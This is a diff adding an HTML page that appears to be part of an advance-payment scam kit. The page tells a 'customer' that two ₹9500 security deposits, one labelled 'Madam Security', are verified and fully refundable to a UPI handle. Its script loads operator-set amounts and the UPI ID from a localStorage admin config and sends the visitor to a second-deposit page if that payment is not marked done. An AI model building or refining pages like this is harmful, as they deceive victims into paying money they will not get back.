@@ -1,0 +1,25 @@
+<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Booking ID Activated</title>
+<style>body{font-family:Inter,sans-serif;background:#070707;color:#fff;margin:0}.header{background:#c70000;padding:14px;text-align:center;font-weight:900;font-size:12px;letter-spacing:2px}.card{max-width:480px;margin:18px auto;background:#151515;border:1px solid #2a2a2a;border-radius:22px;overflow:hidden}.top{padding:24px;text-align:center;background:#111;border-bottom:1px solid #222}.check{width:68px;height:68px;background:#00c851;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:32px;margin:0 auto 14px}.body{padding:20px}.info{background:#0f0f0f;border:1px solid #222;padding:16px;border-radius:14px;font-size:12px;line-height:1.7}.grid2{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:12px}.shot{width:100%;border-radius:12px;border:1px solid #333;max-height:200px;object-fit:contain}.btn{width:100%;padding:17px;background:#c70000;color:#fff;border:none;border-radius:14px;font-weight:900;margin-top:18px;cursor:pointer}</style></head>
+<body>
+<div class="header">SIGNATURE • BOOKING ID VERIFICATION SUCCESS</div>
+<div class="card">
+<div class="top"><div class="check">✓</div><h2>Both Security Deposits Verified</h2><p style="color:#00ff88;font-size:12px;font-weight:900;margin-top:8px">Booking ID Activated Successfully</p></div>
+<div class="body">
+<div class="info">
+<b style="color:#D9FF66">Dear Customer, Payment Verified:</b><br><br>
+✅ <b>1st Payment - Madam Security:</b> ₹<span id="a1">9500</span> ✓ Verified<br>
+✅ <b>2nd Payment - Customer Security:</b> ₹<span id="a2">9500</span> ✓ Verified<br><br>
+Your <b>Booking ID is now ACTIVE</b>. Both security deposits are 100% refundable and will be refunded to your account <b id="upiTxt">kiran9443@ptyes</b> immediately after service completion.<br><br>
+This is one-time security for new customer verification only.<br>
+<div class="grid2"><div><small style="color:#888">1st Screenshot (Madam)</small><img id="s1" class="shot"></div><div><small style="color:#888">2nd Screenshot (Customer)</small><img id="s2" class="shot"></div></div>
+</div>
+<button class="btn" onclick="location.href='success.html'">PROCEED TO ROOM CHECKOUT →</button>
+</div>
+</div>
+<script>
+let cfg=JSON.parse(localStorage.getItem('sig_admin')||'null')||{upi:"kiran9443@ptyes",amt1:"9500",amt2:"9500"};
+document.getElementById('a1').innerText=cfg.amt1;document.getElementById('a2').innerText=cfg.amt2;document.getElementById('upiTxt').innerText=cfg.upi;
+document.getElementById('s1').src=localStorage.getItem('sig_screenshot')||'';document.getElementById('s2').src=localStorage.getItem('sig_screenshot2')||'';
+if(localStorage.getItem('sig_paid2')!=='yes'){location.href='deposit2.html';}
+</script>
+</body></html>
